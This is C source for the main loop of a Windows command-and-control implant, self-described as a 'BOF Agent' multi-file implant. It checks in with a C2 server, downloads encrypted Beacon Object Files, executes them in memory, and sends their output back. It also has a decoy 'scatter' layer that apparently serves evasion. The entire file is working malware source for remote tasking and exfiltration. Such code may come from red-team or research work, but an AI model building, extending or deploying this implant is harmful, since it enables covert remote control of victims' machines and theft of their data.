/*
 * main.c - BOF Agent Entry Point + Beacon Loop
 *
 * This file orchestrates:
 *   - Initialization (VEH, output buffer)
 *   - The beacon loop: sleep → checkin → download BOF → execute → report
 *
 * Uses functions from:
 *   - beacon_api.c  (output buffer, VEH, Beacon API impls)
 *   - coff_loader.c (bof_exec)
 *   - http_client.c (http_request, json_find_str, base64_encode)
 */

#include "agent.h"

/* ====== Per-session crypto state (Phase 3) ====== */
static uint8_t g_session_salt[32];
static int g_crypto_active = 0;

/* Generate 32 random bytes using Windows BCryptGenRandom */
static void generate_salt(uint8_t* salt, int len) {
    /* Use RtlGenRandom (SystemFunction036) — simpler than BCrypt */
    /* Or just use GetTickCount + GetCurrentProcessId + heap address for entropy */
    /* For production: use BCryptGenRandom */
    HMODULE hAdv = GetModuleHandleA("advapi32.dll");
    if (hAdv) {
        typedef BOOLEAN (WINAPI *RtlGenRandom_t)(PVOID, ULONG);
        RtlGenRandom_t pRtlGenRandom = (RtlGenRandom_t)GetProcAddress(hAdv, "SystemFunction036");
        if (pRtlGenRandom) {
            if (pRtlGenRandom(salt, len)) return;
        }
    }
    /* Fallback: weak entropy (debug only) */
    for (int i = 0; i < len; i++) {
        salt[i] = (uint8_t)(GetTickCount() ^ (uintptr_t)&salt[i]);
    }
}

/* Simple base64 encoder (small buffer) */
static void bytes_to_b64(const uint8_t* bytes, int len, char* out, int out_cap) {
    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int o = 0;
    int i = 0;
    while (i + 2 < len) {
        uint32_t v = (bytes[i] << 16) | (bytes[i+1] << 8) | bytes[i+2];
        if (o + 4 >= out_cap) break;
        out[o++] = b64[(v >> 18) & 0x3F];
        out[o++] = b64[(v >> 12) & 0x3F];
        out[o++] = b64[(v >> 6)  & 0x3F];
        out[o++] = b64[v         & 0x3F];
        i += 3;
    }
    int rem = len - i;
    if (rem > 0 && o + 4 < out_cap) {
        uint32_t v = bytes[i] << 16;
        if (rem > 1) v |= bytes[i+1] << 8;
        out[o++] = b64[(v >> 18) & 0x3F];
        out[o++] = b64[(v >> 12) & 0x3F];
        out[o++] = (rem == 1) ? '=' : b64[(v >> 6) & 0x3F];
        out[o++] = '=';
    }
    out[o] = 0;
}


/* ====== Check-in: ask server for next task ====== */
/* Returns: -1 = network error, 0 = no task, 1 = task available
 * task_out = BOF filename, args_b64_out = base64-encoded args blob */
static int do_checkin(char* task_out, int task_cap,
                      char* args_b64_out, int args_b64_cap) {
    char body[1024];

    /* Phase 3: include salt in first checkin (to establish crypto) */
    if (!g_crypto_active) {
        generate_salt(g_session_salt, 32);
        char salt_b64[64];
        bytes_to_b64(g_session_salt, 32, salt_b64, sizeof(salt_b64));

        _snprintf(body, sizeof(body),
            "{\"id\":\"%s\",\"salt\":\"%s\"}", AGENT_ID, salt_b64);
    } else {
        _snprintf(body, sizeof(body), "{\"id\":\"%s\"}", AGENT_ID);
    }

    char resp[8192];
    int resp_len = 0;
    int rc = http_request("POST", "checkin", body, (int)strlen(body),
                          resp, sizeof(resp), &resp_len);
    if (rc != 0) return -1;
    if (resp_len == 0) return -1;

    char bof_name[256] = {0};
    json_find_str(resp, "bof", bof_name, sizeof(bof_name));
    if (bof_name[0] == 0) {
        return 0;  /* no task */
    }
    strncpy(task_out, bof_name, task_cap - 1);
    task_out[task_cap - 1] = 0;

    /* Extract args (base64-encoded blob) */
    json_find_str(resp, "args", args_b64_out, args_b64_cap);

    return 1;
}

/* ====== Download a BOF .o file (with Phase 3 decryption) ====== */
static int download_bof(const char* bof_name, uint8_t* out, int out_cap) {
    char path[512];
    _snprintf(path, sizeof(path), "bof/%s", bof_name);

    /* Use larger buffer for encrypted data (with nonce + tag overhead) */
    static uint8_t raw_buf[BUFSZ * 2];
    int resp_len = 0;
    int rc = http_request("GET", path, NULL, 0, (char*)raw_buf, sizeof(raw_buf), &resp_len);
    if (rc != 0) return -1;

    if (resp_len < 4) {
        fprintf(stderr, "[!] BOF response too short: %d bytes\n", resp_len);
        return -1;
    }

    /* Phase 3: Decrypt BOF payload if crypto is active
     * Wire format: [4B length BE][12B nonce][ciphertext+tag]
     */
    if (g_crypto_active) {
        /* Read 4-byte length prefix */
        uint32_t enc_len = ((uint32_t)raw_buf[0] << 24) |
                            ((uint32_t)raw_buf[1] << 16) |
                            ((uint32_t)raw_buf[2] << 8)  |
                            ((uint32_t)raw_buf[3]);

        fprintf(stderr, "[*] Encrypted BOF: %u bytes (wire: %d)\n",
                enc_len, resp_len);

        if (4 + (int)enc_len > resp_len) {
            fprintf(stderr, "[!] Wire length mismatch\n");
            return -1;
        }

        /* Decrypt: wire_bytes = raw_buf[4 : 4+enc_len] */
        int plaintext_len = crypto_decrypt_bof_payload(
            raw_buf + 4, enc_len, out, out_cap);

        if (plaintext_len < 0) {
            fprintf(stderr, "[!] BOF decryption failed (HMAC/GCM mismatch)\n");
            return -1;
        }

        fprintf(stderr, "[+] BOF decrypted: %d bytes\n", plaintext_len);
        return plaintext_len;
    } else {
        /* No crypto - plaintext mode */
        if (resp_len > out_cap) return -1;
        memcpy(out, raw_buf, resp_len);
        return resp_len;
    }
}

/* ====== Report BOF result back to server ======
 * CRITICAL FIX: Uses HEAP-allocated buffers instead of 2MB stack buffers.
 * Old version crashed silently on Windows (1MB default stack).
 */
static void report_result(const char* task_id, const char* output, int exit_code) {
    size_t out_len = strlen(output);

    /* Heap-allocate base64 buffer (~1.33x expansion) */
    size_t b64_cap = ((out_len + 2) / 3) * 4 + 1;
    char* enc_buf = (char*)malloc(b64_cap);
    if (!enc_buf) {
        /* Fallback: send empty output */
        char small_body[512];
        int n = _snprintf(small_body, sizeof(small_body),
            "{\"id\":\"%s\",\"task_id\":\"%s\",\"output_b64\":\"\",\"exit\":%d}",
            AGENT_ID, task_id, exit_code);
        char resp[256]; int resp_len = 0;
        http_request("POST", "result", small_body, n, resp, sizeof(resp), &resp_len);
        return;
    }

    /* Heap-allocate body buffer (base64 + JSON overhead) */
    size_t body_cap = b64_cap + 1024;
    char* body = (char*)malloc(body_cap);
    if (!body) {
        free(enc_buf);
        return;
    }

    /* Encode output to base64 */
    static const char b64[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t i = 0, o = 0;
    while (i + 2 < out_len) {
        uint32_t v = ((uint8_t)output[i] << 16) | ((uint8_t)output[i+1] << 8) | (uint8_t)output[i+2];
        enc_buf[o++] = b64[(v >> 18) & 0x3F];
        enc_buf[o++] = b64[(v >> 12) & 0x3F];
        enc_buf[o++] = b64[(v >> 6)  & 0x3F];
        enc_buf[o++] = b64[v         & 0x3F];
        i += 3;
    }
    int rem = (int)(out_len - i);
    if (rem > 0) {
        uint32_t v = (uint8_t)output[i] << 16;
        if (rem > 1) v |= (uint8_t)output[i+1] << 8;
        enc_buf[o++] = b64[(v >> 18) & 0x3F];
        enc_buf[o++] = b64[(v >> 12) & 0x3F];
        enc_buf[o++] = (rem == 1) ? '=' : b64[(v >> 6) & 0x3F];
        enc_buf[o++] = '=';
    }
    enc_buf[o] = 0;

    int body_len = _snprintf(body, body_cap,
        "{\"id\":\"%s\",\"task_id\":\"%s\",\"output_b64\":\"%s\",\"exit\":%d}",
        AGENT_ID, task_id, enc_buf, exit_code);

    char resp[256];
    int resp_len = 0;
    http_request("POST", "result", body, body_len, resp, sizeof(resp), &resp_len);

    free(enc_buf);
    free(body);
}

/* ====== Beacon loop: sleep → checkin → exec → report → repeat ====== */
static void beacon_loop(void) {
    printf("[*] Agent ID    : %s\n", AGENT_ID);
    printf("[*] C2 server   : %s:%d\n", C2_HOST, C2_PORT);
    printf("[*] Sleep cycle : %ds\n\n", SLEEP_SEC);
    fflush(stdout);

    int backoff = SLEEP_SEC;
    int max_backoff = 60;

    while (1) {
        char bof_name[256] = {0};
        char args_b64[8192] = {0};  /* base64-encoded args from server */
        int rc = do_checkin(bof_name, sizeof(bof_name),
                           args_b64, sizeof(args_b64));

        if (rc < 0) {
            printf("[!] Server unreachable, retry in %ds...\n", backoff);
            fflush(stdout);
            Sleep(backoff * 1000);
            backoff = (backoff * 2 > max_backoff) ? max_backoff : backoff * 2;
            continue;
        }
        backoff = SLEEP_SEC;

        /* Phase 3: Initialize crypto after first successful checkin */
        if (!g_crypto_active) {
            fprintf(stderr, "[*] Initializing crypto (PSK + session salt)...\n");
            fflush(stderr);
            if (crypto_init(g_session_salt, 32) == 0) {
                g_crypto_active = 1;
                fprintf(stderr, "[+] Crypto initialized - BOF traffic encrypted\n");
            } else {
                fprintf(stderr, "[!] Crypto init failed - using plaintext mode\n");
            }
            fflush(stderr);
        }

        if (rc == 0) {
            Sleep(SLEEP_SEC * 1000);
            continue;
        }

        printf("[+] Task received: %s", bof_name);
        if (args_b64[0]) {
            printf(" (with args)");
        }
        printf("\n");
        fflush(stdout);

        static uint8_t bof_buf[BUFSZ];
        int bof_size = download_bof(bof_name, bof_buf, sizeof(bof_buf));
        if (bof_size <= 0) {
            printf("[!] Failed to download BOF\n");
            fflush(stdout);
            Sleep(SLEEP_SEC * 1000);
            continue;
        }
        printf("[+] BOF downloaded: %d bytes\n", bof_size);
        fflush(stdout);

        uint8_t* bof_copy = (uint8_t*)malloc(bof_size);
        if (!bof_copy) {
            printf("[!] malloc failed\n");
            fflush(stdout);
            Sleep(SLEEP_SEC * 1000);
            continue;
        }
        memcpy(bof_copy, bof_buf, bof_size);

        /* Decode args from base64 (if any) */
        char* args_buf = NULL;
        int args_len = 0;
        if (args_b64[0]) {
            args_buf = (char*)base64_decode(args_b64, &args_len);
            if (args_buf && args_len > 0) {
                fprintf(stderr, "[*] Args decoded: %d bytes\n", args_len);
            } else {
                args_buf = NULL;
                args_len = 0;
            }
        }

        char empty_args[1] = {0};
        char* exec_args = args_buf ? args_buf : empty_args;
        int exec_args_len = args_buf ? args_len : 0;

        fprintf(stderr, "[*] Calling bof_exec()...\n");
        fflush(stderr);
        int exit_code = bof_exec(bof_copy, bof_size, exec_args, exec_args_len);
        fprintf(stderr, "[*] bof_exec returned: exit=%d\n", exit_code);
        fflush(stderr);

        /* Layer A: If exit_code == 77, decoy scatter done.
         * Now fetch the REAL BOF (.o file) and execute it normally.
         * The real BOF filename is the packed name without ".packed.bin"
         * and with "bof_" prefix + ".x64.o" suffix. */
        if (exit_code == 77) {
            fprintf(stderr, "[*] Layer A scatter complete, fetching real BOF...\n");
            fflush(stderr);

            /* Convert "whoami.packed.bin" → "bof_whoami.x64.o" */
            char real_bof_name[256] = {0};
            const char* packed = bof_name;  /* e.g., "whoami.packed.bin" */
            /* Extract short name: everything before ".packed.bin" */
            char short_name[128] = {0};
            strncpy(short_name, packed, strlen(packed) - strlen(".packed.bin"));
            short_name[sizeof(short_name) - 1] = 0;
            _snprintf(real_bof_name, sizeof(real_bof_name),
                      "bof_%s.x64.o", short_name);

            fprintf(stderr, "[*] Fetching real BOF: %s\n", real_bof_name);
            fflush(stderr);

            /* Download real BOF */
            int real_bof_size = download_bof(real_bof_name, bof_buf, sizeof(bof_buf));
            if (real_bof_size <= 0) {
                printf("[!] Failed to download real BOF after Layer A scatter\n");
                fflush(stdout);
            } else {
                printf("[+] Real BOF downloaded: %d bytes\n", real_bof_size);
                fflush(stdout);

                uint8_t* real_bof_copy = (uint8_t*)malloc(real_bof_size);
                if (real_bof_copy) {
                    memcpy(real_bof_copy, bof_buf, real_bof_size);

                    /* Execute real BOF normally */
                    fprintf(stderr, "[*] Calling bof_exec() for real BOF...\n");
                    fflush(stderr);
                    exit_code = bof_exec(real_bof_copy, real_bof_size,
                                          exec_args, exec_args_len);
                    fprintf(stderr, "[*] bof_exec returned: exit=%d\n", exit_code);
                    fflush(stderr);

                    free(real_bof_copy);
                }
            }
        }

        /* Print captured output (BOF's own output via BeaconPrintf) */
        if (g_output_buf && g_output_len > 0) {
            printf("--- BOF OUTPUT START ---\n");
            fwrite(g_output_buf, 1, g_output_len, stdout);
            printf("\n--- BOF OUTPUT END (exit=%d, 0x%08X) ---\n",
                   exit_code, (unsigned)exit_code);
            fflush(stdout);
        } else {
            printf("[!] BOF produced no output (exit=%d)\n", exit_code);
            fflush(stdout);
        }

        /* Report result back to server (heap-allocated, no stack overflow) */
        report_result(bof_name, g_output_buf ? g_output_buf : "", exit_code);
        printf("[*] Result sent to server\n\n");
        fflush(stdout);

        free(bof_copy);

        /* Zero and free args buffer (security cleanup) */
        if (args_buf) {
            memset(args_buf, 0, args_len);
            free(args_buf);
        }

        /* Reset output buffer for next BOF */
        output_reset();

        Sleep(SLEEP_SEC * 1000);
    }
}

/* ====== Entry point ====== */
int main(int argc, char** argv) {
    (void)argc; (void)argv;

    /* Register VEH (catches BOF crashes like 0xC0000005) */
    veh_register();

    /* Allocate output buffer (heap - safe for large outputs) */
    g_output_cap = 65536;
    g_output_buf = (char*)malloc(g_output_cap);
    if (g_output_buf) g_output_buf[0] = 0;

    printf("=========================================\n");
    printf("  BOF Agent v1.1 (multi-file implant)   \n");
    printf("=========================================\n");
    fflush(stdout);

    beacon_loop();
    return 0;
}
